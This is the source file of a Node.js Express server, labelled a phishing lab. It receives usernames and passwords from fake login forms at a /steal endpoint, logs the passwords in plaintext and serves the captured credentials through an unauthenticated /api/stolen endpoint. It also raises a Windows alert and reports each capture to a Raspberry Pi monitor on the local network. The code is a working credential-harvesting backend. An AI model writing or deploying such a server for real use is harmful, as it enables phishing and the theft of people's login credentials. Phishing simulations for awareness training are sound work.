// C:\Users\HARIS\OneDrive\Desktop\phish-server\server.js
// NEXUS PHISHING LAB – WINDOWS BEEP SERVER + PI MONITORING

const express = require("express")
const cors = require("cors")
const path = require("path")
const { exec } = require("child_process")

// For Node <18, install node-fetch@2 and uncomment:
// const fetch = require("node-fetch")

const app = express()
const PORT = 5000

// === PI CONFIG: continuous monitoring target ===
const PI_IP = "10.159.103.116"
const PI_PORT = 8082
const PI_ATTACK_URL = `http://${PI_IP}:${PI_PORT}/pi/attack`

// In‑memory store of captured creds (last 100)
const stolen = []

app.use(cors())
app.use(express.json())
app.use(express.static(path.join(__dirname, "public")))

// ---- WINDOWS BEEP + POPUP ----
function windowsBeepAlert(entry) {
  console.log("PHISHING ATTACK DETECTED! Beeping on Windows...")

  // Beep in console
  exec("powershell -c [Console]::Beep(1500,800)", (err) => {
    if (err) {
      console.log("Beep failed (maybe blocked):", err.message)
    }
  })

  // Popup message box
  const msg = `PHISHING ATTACK DETECTED!\nUser: ${entry.username}\nIP: ${entry.ip}`
  exec(
    'powershell -c Add-Type -AssemblyName System.Windows.Forms; ' +
      `[System.Windows.Forms.MessageBox]::Show('${msg.replace(
        /'/g,
        "''"
      )}','NEXUS Alert','OK','Warning')`,
    () => {}
  )
}

// ---- SEND EVENT TO PI (continuous monitoring + attack type) ----
async function sendPiMonitoringEvent(entry, attackType = "phishing") {
  // kind=login means “login detected”; attackType says what type
  const payload = {
    kind: "login",
    type: attackType,
    details: {
      user: entry.username,
      ip: entry.ip,
      source: entry.source,
      time: entry.time,
      userAgent: entry.userAgent,
    },
  }

  try {
    console.log("Sending monitoring event to Pi:", PI_ATTACK_URL, payload)

    const resp = await fetch(PI_ATTACK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })

    const text = await resp.text()
    console.log("Pi response:", resp.status, text)
  } catch (err) {
    console.log("Failed to send event to Pi:", err.message)
  }
}

// ---- MAIN PHISH ENDPOINT (called by AuthZee or fake forms) ----
app.post("/steal", async (req, res) => {
  const { username, password, source } = req.body || {}
  const ip = (req.headers["x-forwarded-for"] || req.ip || "unknown").replace(
    "::ffff:",
    ""
  )

  if (!username || !password) {
    return res.status(400).json({ error: "Username and password required" })
  }

  const entry = {
    time: new Date().toISOString(),
    username,
    password,
    ip,
    userAgent: req.headers["user-agent"]?.slice(0, 100) || "",
    source: source || "phish-form",
  }

  stolen.push(entry)
  if (stolen.length > 100) stolen.shift()

  console.log("🎣 PHISH / CRED CAUGHT!")
  console.log("User:", entry.username)
  console.log("Pass:", entry.password)
  console.log("IP:", entry.ip)
  console.log("Source:", entry.source)

  // Trigger Windows beep + popup
  windowsBeepAlert(entry)

  // Continuous monitoring event to Pi (login + attack type)
  // For now attackType is always "phishing" in this lab
  sendPiMonitoringEvent(entry, "phishing")

  return res.json({ ok: true, captured: entry.username, source: entry.source })
})

// ---- VIEW LAST CAPTURED CREDS ----
app.get("/api/stolen", (req, res) => {
  res.json(stolen.slice(-20))
})

// ---- SIMPLE HEALTH CHECK ----
app.get("/health", (req, res) => {
  res.json({ status: "NEXUS PHISH LAB", windows_beep: true })
})

// ---- START SERVER ----
app.listen(PORT, () => {
  console.log("=======================================")
  console.log("  NEXUS PHISHING LAB – WINDOWS BEEP")
  console.log("=======================================")
  console.log(`Phish server running on http://10.159.103.185:${PORT}`)
  console.log(`POST creds to http://10.159.103.185:${PORT}/steal`)
  console.log(`Pi monitoring target: ${PI_ATTACK_URL}`)
})
